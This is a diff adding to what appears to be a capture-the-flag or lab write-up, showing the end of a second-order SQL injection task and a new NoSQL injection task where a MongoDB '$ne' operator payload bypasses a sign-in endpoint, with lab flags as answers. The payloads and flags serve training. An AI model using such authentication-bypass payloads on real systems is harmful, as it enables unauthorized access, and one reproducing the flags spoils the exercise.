@@ -55,3 +55,16 @@ POST /api/a3/sql_injection/second_order/login
 {"message":{"html":"<h1>Welcome Mr 8b815836739530ea8cc7929c29b63739</h1>", ...}}
 
 **Flag:** 8b815836739530ea8cc7929c29b63739
+
+## Task 5 - NoSQL Injection Discovery
+
+**Vulnerable endpoint:** /api/a3/nosql_injection/sign_in (POST)
+
+**Baseline (fails):**
+{"username":"admin","password":"wrongpassword"} -> Invalid Credentials Provided
+
+**Injection payload (auth bypass via MongoDB operator):**
+{"username":{"$ne":null},"password":{"$ne":null}}
+
+**Result:**
+{"status":"success","message":"Congratulations For your Sign in!\nFLAG: 56c48f5ae9ab0ffaaafb2a28d4999341"}
